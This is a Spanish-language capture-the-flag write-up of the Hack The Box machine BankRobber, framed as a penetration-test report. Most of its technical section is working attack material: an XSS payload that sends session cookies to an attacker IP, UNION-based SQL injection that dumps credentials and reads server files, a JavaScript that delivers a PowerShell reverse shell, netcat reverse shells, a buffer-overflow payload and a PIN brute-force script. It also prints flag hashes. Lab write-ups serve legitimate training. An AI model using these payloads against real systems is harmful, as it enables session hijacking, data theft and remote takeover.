---
title: "Informe Técnico: BankRobber (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina BankRobber de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: BankRobber

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Insane-red?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **BankRobber** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | BankRobber |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Insane |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

Enumeración

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_01.png)

![Captura de pantalla 2025-08-30 140942.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_02.png)

```jsx
fromId=3&toId=2&amount=76&comment=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image%28%29.src%3D%27http%3A%2F%2F10.10.14.8%2F%3Fc%3D%27%2Bbtoa%28document.cookie%7C%7C%27EMPTY%27%29%22%3E
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_04.png)

![Captura de pantalla 2025-08-30 145004.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_05.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_06.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_07.png)

```jsx
1' UNION SELECT null, user(), null-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_08.png)

```jsx
1' UNION SELECT null, database(), null-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_09.png)

```jsx
1' UNION ALL SELECT NULL, GROUP_CONCAT(table_name), NULL
FROM information_schema.tables
WHERE table_schema='bankrobber'-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_10.png)

```jsx
1' UNION ALL SELECT NULL, GROUP_CONCAT(column_name), NULL
FROM information_schema.columns
WHERE table_schema='bankrobber' AND table_name='users'-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_11.png)

```jsx
1' UNION ALL SELECT NULL,
CONCAT_WS(0x0a, GROUP_CONCAT(CONCAT(username,0x3a,password) SEPARATOR 0x0a)),
NULL
FROM bankrobber.users-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_12.png)

```jsx
1' UNION ALL SELECT NULL, LOAD_FILE('C:/xampp/apache/conf/httpd.conf'), NULL-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_13.png)

```jsx
1' UNION ALL SELECT NULL, LOAD_FILE('C:/Windows/win.ini'), NULL-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_14.png)

```jsx
1' UNION ALL SELECT NULL, LOAD_FILE('C:/XAMPP/htdocs/admin/backdoorchecker.php'), NULL-- -
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_15.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_16.png)

```jsx
fromId=3&toId=4&amount=4&comment=<script+src%3dhttp%3a//10.10.14.8/script.js></script>
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_17.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_18.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_19.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_20.png)

R: 4de6be1b35f65b8281ea5c7cf7075b2e

![Captura de pantalla 2025-08-30 165531.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_21.png)

```jsx
cat script.js
var x=new XMLHttpRequest();
x.open('POST','[http://localhost/admin/backdoorchecker.php](http://localhost/admin/backdoorchecker.php)');
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.withCredentials=true;
x.send('cmd='+encodeURIComponent(
'dir|powershell -NoP -W Hidden -c "$c=New-Object Net.Sockets.TCPClient(\'10.10.14.8\',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=(iex $d|Out-String);$o=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($o,0,$o.Length)}"'
));
```

Escalada 

netstat -ano

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_22.png)

```jsx
chisel server —port 1234 reverse
```

```jsx
.\chisel.exe client 10.10.14.8:1234 R:910:127.0.0.1:910
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_23.png)

```jsx
C:\Users\Public\nc.exe 10.10.14.3 4444 -e cmd.exe
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_24.png)

```jsx
 msf-pattern_create -l 150
```

```jsx
msf-pattern_offset -q 0Ab1
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_25.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_26.png)

![Captura de pantalla 2025-08-30 180520.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_27.png)

```jsx
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\Users\Cortin\Desktop\nc64.exe -e cmd.exe 10.10.14.8 9001
```

09f3b8ad1aa0afbec27961f53f04f644

![Captura de pantalla 2025-08-30 180348.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_28.png)

```jsx

from pwn import *
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 910

for i in range(10000):
    code = f"{i:04d}"           # 4 dígitos con ceros a la izquierda
    try:
        r = remote(HOST, PORT, level='error')
        r.recvuntil(b"[$] ", timeout=2)     # espera al prompt
        r.sendline(code.encode())
        resp = r.recvline(timeout=2) or b""
        r.close()
    except Exception as e:
        log.warning(f"Error con {code}: {e}")
        continue

    # si NO aparece "Access denied", lo damos por válido
    if b"Access denied" not in resp:
        log.success(f"Valid code found: {code}")
        print(resp.decode(errors='ignore').strip())
        break

    if i % 100 == 0:
        log.info(f"Probados hasta {code}")

else:
    log.failure("No code válido encontrado.")
```

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
